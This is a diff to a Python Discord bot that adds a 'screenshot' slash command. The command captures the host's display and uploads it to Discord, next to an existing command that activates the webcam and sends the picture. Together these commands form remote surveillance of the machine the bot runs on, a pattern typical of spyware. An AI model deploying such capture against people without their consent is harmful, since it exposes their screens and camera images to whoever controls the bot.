@@ -5,6 +5,7 @@ from dotenv import load_dotenv
 from discord.ext import commands
 # import aiofiles
 import webcam
+import screencapture
 
 load_dotenv()
 
@@ -74,6 +75,17 @@ async def showcam(interaction: discord.Interaction):
         await interaction.followup.send(file=discord.File(cam.out_name))
     else:
         await interaction.followup.send(content="Failed to activate webcam: " + retcode)
+
+@client.tree.command(name="screenshot", description="Take a screenshot of the users's current display", guild=GUILD_ID)
+async def screenshot(interaction: discord.Interaction):
+    await interaction.response.defer()
+    sshot = screencapture.screencapture()
+    if sshot.out_name != "":
+        imgsaved = sshot.out_name
+        print(imgsaved)
+        await interaction.followup.send(file=discord.File(imgsaved))
+    else:
+        await interaction.followup.send(content="Failed to capture a screenshot!")
 
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
